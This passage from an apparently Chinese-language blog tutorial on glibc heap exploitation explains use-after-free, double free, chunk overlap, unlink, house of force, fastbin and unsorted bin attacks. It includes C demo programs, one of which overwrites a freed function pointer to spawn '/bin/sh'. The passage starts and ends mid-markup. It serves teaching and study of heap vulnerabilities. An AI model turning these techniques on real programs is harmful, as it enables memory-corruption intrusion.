class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*func_ptr)</span><span class="params">(<span class="keyword">char</span> *)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys1</span><span class="params">(<span class="keyword">char</span> command[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">system(command);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">echo</span><span class="params">(<span class="keyword">char</span> content[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>,content);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    func_ptr *p1=(func_ptr*)<span class="built_in">malloc</span>(<span class="number">4</span>*<span class="keyword">sizeof</span>(<span class="keyword">int</span>));<span class="comment">//申请了4个int大小的内存</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc addr: %p\n"</span>,p1);<span class="comment">//因为前2个也就是0x10是用来管理chunk的</span></span><br><span class="line">    p1[<span class="number">2</span>]=echo;<span class="comment">//所以从第三个开始</span></span><br><span class="line">    p1[<span class="number">2</span>](<span class="string">"hello world\n"</span>);</span><br><span class="line">    <span class="built_in">free</span>(p1); <span class="comment">//在这里free了p1,但并未将p1置空,导致后续可以再使用p1指针</span></span><br><span class="line">    p1[<span class="number">2</span>](<span class="string">"hello again\n"</span>); <span class="comment">//p1指针未被置空,虽然free了,但仍可使用.</span></span><br><span class="line">    func_ptr *p2=(func_ptr*)<span class="built_in">malloc</span>(<span class="number">4</span>*<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    <span class="comment">//free一块内存后,再次申请同样大小的指针会把刚刚释放的内存分配出来</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc addr: %p\n"</span>,p2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc addr: %p\n"</span>,p1);<span class="comment">//p2与p1指针指向的内存为同一地址</span></span><br><span class="line">    p2[<span class="number">2</span>]=sys1; <span class="comment">//在这里将p1指针里面保存的echo函数指针覆盖成为了sys1指针.</span></span><br><span class="line">    p1[<span class="number">2</span>](<span class="string">"/bin/sh"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>我们可以看到这个p1和p2的地址是相同的</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219145625345.png" alt="image-20201219145625345"></p></blockquote><h2 id="0x03-Double-Free"><a href="#0x03-Double-Free" class="headerlink" title="0x03 Double Free"></a>0x03 Double Free</h2><h3 id="1-概念-2"><a href="#1-概念-2" class="headerlink" title="1.概念"></a>1.概念</h3><p>Double Free是UAF较为特殊的一种</p><h3 id="2-演示"><a href="#2-演示" class="headerlink" title="2.演示"></a>2.演示</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line">    <span class="keyword">char</span> *a = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="keyword">char</span> *b = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="keyword">char</span> *c = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(a, <span class="string">"AAAAAAAA"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(b, <span class="string">"BBBBBBBB"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(c, <span class="string">"CCCCCCCC"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(9) %p points to %s\n"</span>, a, a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(9) %p points to %s\n"</span>, b, b);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(9) %p points to %s\n"</span>, c, c);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one %p.\n"</span>, a);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Then freeing another one %p.\n"</span>, b);</span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one %p again.\n"</span>, a);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line">    <span class="keyword">char</span> *d = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="keyword">char</span> *e = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="keyword">char</span> *f = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(d, <span class="string">"DDDDDDDD"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"4st malloc(9) %p points to %s the first time\n"</span>, d, d);</span><br><span class="line">    <span class="built_in">strcpy</span>(e, <span class="string">"EEEEEEEE"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"5nd malloc(9) %p points to %s\n"</span>, e, e);</span><br><span class="line">    <span class="built_in">strcpy</span>(f, <span class="string">"FFFFFFFF"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"6rd malloc(9) %p points to %s the second time\n"</span>, f, f);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219160532780.png" alt="image-20201219160532780"></p><p>直接根据输出理解其中的原理 也就是我上面画的这个图</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219160630662.png" alt="image-20201219160630662"></p></blockquote><h2 id="0x04-overlap"><a href="#0x04-overlap" class="headerlink" title="0x04 overlap"></a>0x04 overlap</h2><h3 id="1-概念-3"><a href="#1-概念-3" class="headerlink" title="1.概念"></a>1.概念</h3><p>chunk extend 是堆漏洞的一种常见利用手法，通过 extend 可以实现 chunk overlapping 的效果。</p><h3 id="2-利用条件-1"><a href="#2-利用条件-1" class="headerlink" title="2.利用条件"></a>2.利用条件</h3><ul><li>程序中存在基于堆的漏洞</li><li>漏洞可以控制 chunk header 中的数据</li></ul><h3 id="3-演示1（fastbin）"><a href="#3-演示1（fastbin）" class="headerlink" title="3.演示1（fastbin）"></a>3.演示1（fastbin）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第一个0x10的chunk</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第二个0x10的chunk</span></span><br><span class="line">    sleep(<span class="number">0</span>); <span class="comment">//斷點</span></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr<span class="number">-0x8</span>)=<span class="number">0x41</span>;<span class="comment">// 修改第一个块的size域</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0x30</span>);<span class="comment">// 实现 extend，控制了第二个块的内容</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>直接打断点</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219214608484.png" alt="image-20201219214608484"></p><p>可以看到分配了两个</p><p>这时我们把p1的size位改变再进行释放，就会进入fastbin中</p><p>继续分配我们就可以把p2的数据改变</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219214801301.png" alt="image-20201219214801301"></p><p>fastbin如我们所料</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219214832357.png" alt="image-20201219214832357"></p><p>演示完成 这时我们就可以改变p2的数据</p></blockquote><h3 id="4-演示2（smallbin）"><a href="#4-演示2（smallbin）" class="headerlink" title="4.演示2（smallbin）"></a>4.演示2（smallbin）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x80</span>);<span class="comment">//分配第一个 0x80 的chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第二个 0x10 的chunk2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//防止与top chunk合并</span></span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">int</span>)ptr<span class="number">-0x8</span>)=<span class="number">0xb1</span>;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0xa0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>直接断点</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219215247031.png" alt="image-20201219215247031"></p><p>修改size值之后 释放 进入unsortedbin中</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219215357168.png" alt="image-20201219215357168"></p><p>继续分配</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219215517292.png" alt="image-20201219215517292"></p><p>我们这样就可以直接修改数据了</p></blockquote><h3 id="5-演示3（向前overlap）"><a href="#5-演示3（向前overlap）" class="headerlink" title="5.演示3（向前overlap）"></a>5.演示3（向前overlap）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr1,*ptr2,*ptr3,*ptr4;</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">128</span>);<span class="comment">//smallbin1</span></span><br><span class="line">    ptr2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//fastbin1</span></span><br><span class="line">    ptr3=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//fastbin2</span></span><br><span class="line">    ptr4=<span class="built_in">malloc</span>(<span class="number">128</span>);<span class="comment">//smallbin2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//防止与top合并</span></span><br><span class="line">    <span class="built_in">free</span>(ptr1);</span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr4<span class="number">-0x8</span>)=<span class="number">0x90</span>;<span class="comment">//修改pre_inuse域</span></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr4<span class="number">-0x10</span>)=<span class="number">0xd0</span>;<span class="comment">//修改pre_size域</span></span><br><span class="line">    <span class="built_in">free</span>(ptr4);<span class="comment">//unlink进行前向extend</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x150</span>);<span class="comment">//占位块</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>断点</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219220938551.png" alt="image-20201219220938551"></p><p>修改指针后</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219221233429.png" alt="image-20201219221233429"></p><p>此时释放p4  进入unsortedbin中 如果进行分配 那么我们就可以向前overlap</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219221322641.png" alt="image-20201219221322641"></p><p>我们最后来分配一下</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219221445409.png" alt="image-20201219221445409"></p></blockquote><h2 id="0x05-unlink"><a href="#0x05-unlink" class="headerlink" title="0x05 unlink"></a>0x05 unlink</h2><h3 id="1-概念-4"><a href="#1-概念-4" class="headerlink" title="1.概念"></a>1.概念</h3><ul><li>双向链表中移除/添加一个chunk时，会发生断链的操作，这个断链的过程就叫做unlink</li><li>注意事项：unlink不发生在fastbin和smallbin中，所以fastbin和smallbin容易产生漏洞</li></ul><h3 id="2-发生场景"><a href="#2-发生场景" class="headerlink" title="2.发生场景"></a>2.发生场景</h3><p><strong>malloc时：</strong></p><ul><li>从恰好大小合适的largebin中获取chunk，发生unlink</li><li>从比malloc要求大的largebin中取chunk，发生unlink</li></ul><p><strong>free时：</strong></p><ul><li>free之后，与前后空闲的chunk进行合并</li></ul><p><strong>malloc consolidate时：</strong></p><ul><li>consolidate时，chunk之间的unlink</li></ul><p><strong>realloc时：</strong></p><ul><li>向前扩展，合并物理相邻高地址空闲chunk</li></ul><h3 id="3-古老的unlink"><a href="#3-古老的unlink" class="headerlink" title="3.古老的unlink"></a>3.古老的unlink</h3><p>其中P为需要释放/添加的chunk</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/unlink_smallbin_intro.png" alt="img"></p><p>unlink的代码</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/JgR9imeK6YMQ2rZ.png" alt="image-20200723164353967"></p><blockquote><p>(1)将前一个chunk占用的内存合并到当前chunk;</p><p>(2)修改指向当前chunk的指针，改为指向前一个chunk。</p><p>(3)使用unlink宏，将前一个free chunk从双向循环链表中移除</p></blockquote><p>此例来自ctf-wiki</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/old_unlink_vul.png" alt="img"></p><p>现在有物理空间连续的两个 chunk（Q，Nextchunk），其中 Q 处于使用状态、Nextchunk 处于释放状态。那么如果我们通过某种方式（<strong>比如溢出</strong>）将 Nextchunk 的 fd 和 bk 指针修改为指定的值。则当我们 free(Q) 时</p><ul><li>glibc 判断这个块是 small chunk</li><li>判断前向合并，发现前一个 chunk 处于使用状态，不需要前向合并</li><li>判断后向合并，发现后一个 chunk 处于空闲状态，需要合并</li><li>继而对 Nextchunk 采取 unlink 操作</li></ul><p>那么 unlink 具体执行的效果是什么样子呢？我们可以来分析一下</p><p><strong>以下12和8都是对于32位来说的</strong></p><ul><li>FD=P-&gt;fd = target addr -12</li><li>BK=P-&gt;bk = expect value</li><li>FD-&gt;bk = BK，即 *(target addr-12+12)=BK=expect value</li><li>BK-&gt;fd = FD，即 *(expect value +8) = FD = target addr-12</li></ul><p>这张图片应该更好理解</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/BTQOKLG2XSyHqge.png" alt="image-20200723165236574"></p><h3 id="4-新的unlink"><a href="#4-新的unlink" class="headerlink" title="4.新的unlink"></a>4.新的unlink</h3><p>新版的unlink加入了下面这部分代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; fd bk</span><br><span class="line">if (__builtin_expect (FD-&gt;bk !&#x3D; P || BK-&gt;fd !&#x3D; P, 0))                      \</span><br><span class="line">  malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  \</span><br></pre></td></tr></table></figure><p>如果不指向P，那么就出现了问题</p><p>那如何利用呢？</p><p>首先我们通过覆盖，将 nextchunk 的 FD 指针指向了 fakeFD，将 nextchunk 的 BK 指针指向了 fakeBK 。那么为了通过验证，我们需要</p><ul><li><code>fakeFD -&gt; bk == P</code> &lt;=&gt; <code>*(fakeFD + 12) == P</code></li><li><code>fakeBK -&gt; fd == P</code> &lt;=&gt; <code>*(fakeBK + 8) == P</code></li></ul><p>当满足上述两式时，可以进入 Unlink 的环节，进行如下操作：</p><ul><li><code>fakeFD -&gt; bk = fakeBK</code> &lt;=&gt; <code>*(fakeFD + 12) = fakeBK</code></li><li><code>fakeBK -&gt; fd = fakeFD</code> &lt;=&gt; <code>*(fakeBK + 8) = fakeFD</code></li></ul><p>如果让 fakeFD + 12 和 fakeBK + 8 指向同一个指向 P 的指针，那么：</p><ul><li><code>*P = P - 8</code></li><li><code>*P = P - 12</code></li></ul><p>即通过此方式，P 的指针指向了比自己低 12 的地址处。此方法虽然不可以实现任意地址写，但是可以修改指向 chunk 的指针，这样的修改是可以达到一定的效果的。</p><h3 id="5-利用条件"><a href="#5-利用条件" class="headerlink" title="5.利用条件"></a>5.利用条件</h3><ol><li>UAF ，可修改 free 状态下 smallbin 或是 unsorted bin 的 fd 和 bk 指针</li><li>已知位置存在一个指针指向可进行 UAF 的 chunk</li></ol><h3 id="6-效果"><a href="#6-效果" class="headerlink" title="6.效果"></a>6.效果</h3><p>使得已指向 UAF chunk 的指针 ptr 变为 ptr - 0x18</p><h2 id="0x06-house-of-force"><a href="#0x06-house-of-force" class="headerlink" title="0x06 house of force"></a>0x06 house of force</h2><h3 id="1-原理"><a href="#1-原理" class="headerlink" title="1.原理"></a>1.原理</h3><p>攻击者通过堆溢出或者其他方式，控制到topchunk的size成员，这样我们就可以使topchunk的地址超出正常的堆段的地址，这样我们就可以控制到超出堆段之外的内存</p><h3 id="2-利用条件-2"><a href="#2-利用条件-2" class="headerlink" title="2.利用条件"></a>2.利用条件</h3><ul><li>①通过堆溢出或其他方式，控制到topchunk的size成员</li><li>②将topchunk的size成员变为一个非常大的数，这样topchunk就会超出内存中的堆段，从而访问到其他段的内存地址（got表的地址）</li><li>③此时通过malloc申请内存的时候，申请的就是got的内存地址，就可以更改got内存的内容</li></ul><h2 id="0x07-fastbin-attack"><a href="#0x07-fastbin-attack" class="headerlink" title="0x07 fastbin attack"></a>0x07 fastbin attack</h2><ul><li>Fastbin Double Free</li><li>House of Spirit</li><li>Alloc to Stack</li><li>Arbitrary Alloc</li></ul><p>其中，前两种主要漏洞侧重于利用 <code>free</code> 函数释放<strong>真的 chunk 或伪造的 chunk</strong>，然后再次申请 chunk 进行攻击，后两种侧重于故意修改 <code>fd</code> 指针，直接利用 <code>malloc</code> 申请指定位置 chunk 进行攻击。</p><h2 id="0x08-unsorted-bin-attack"><a href="#0x08-unsorted-bin-attack" class="headerlink" title="0x08 unsorted bin attack"></a>0x08 unsorted bin attack</h2><h3 id="1-概念-5"><a href="#1-概念-5" class="headerlink" title="1.概念"></a>1.概念</h3><p>Unsorted Bin Attack 被利用的前提是控制 Unsorted Bin Chunk 的 bk 指针。Unsorted Bin Attack 可以达到的效果是实现修改任意地址值为一个较大的数值。</p><h3 id="2-使用情况"><a href="#2-使用情况" class="headerlink" title="2.使用情况"></a>2.使用情况</h3><ol><li>Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO，<strong>即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取</strong>。</li><li>在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中。</li></ol><h3 id="3-原理解释"><a href="#3-原理解释" class="headerlink" title="3.原理解释"></a>3.原理解释</h3><ol><li><p>unsortedbin正常存储freechunk的结构如图所示，此时这个freechunk是我们还可以通过指针操控的（虽然free了但没有置空）<img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201222212418753.png" alt="image-20201222212418753"></p></li><li><p>如果在取走堆块之前，我们将unsortedbin中的chunk的bk指针改为我们的target地址，如下图所示：<img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201222212555394.png" alt="image-20201222212555394"></p></li><li><p>此时我们去malloc堆块的时候就会发生如下代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** victim is free chunk **/</span></span><br><span class="line">bck = victim-&gt;bk;</span><br><span class="line">unsorted_chunks(av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks(av);</span><br></pre></td></tr></table></figure><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201222213058942.png" alt="image-20201222213058942"></p><p>在我们移除victim之后就变成了这样。我们的target的fd的内容为malloc_state结构体的unsortedbin链的fd指针了</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201222213335526.png" alt="image-20201222213335526"></p></li></ol><h3 id="4-演示"><a href="#4-演示" class="headerlink" title="4.演示"></a>4.演示</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file demonstrates unsorted bin attack by write a large "</span></span><br><span class="line">                  <span class="string">"unsigned long value into stack\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(</span><br><span class="line">      <span class="built_in">stderr</span>,</span><br><span class="line">      <span class="string">"In practice, unsorted bin attack is generally prepared for further "</span></span><br><span class="line">      <span class="string">"attacks, such as rewriting the "</span></span><br><span class="line">      <span class="string">"global variable global_max_fast in libc for further fastbin attack\n\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> target_var = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,</span><br><span class="line">          <span class="string">"Let's first look at the target we want to rewrite on stack:\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%p: %ld\n\n"</span>, &amp;target_var, target_var);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> *p = <span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we allocate first normal chunk on the heap at: %p\n"</span>,</span><br><span class="line">          p);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"And allocate another normal chunk in order to avoid "</span></span><br><span class="line">                  <span class="string">"consolidating the top chunk with"</span></span><br><span class="line">                  <span class="string">"the first one during the free()\n\n"</span>);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We free the first chunk now and it will be inserted in the "</span></span><br><span class="line">                  <span class="string">"unsorted bin with its bk pointer "</span></span><br><span class="line">                  <span class="string">"point to %p\n"</span>,</span><br><span class="line">          (<span class="keyword">void</span> 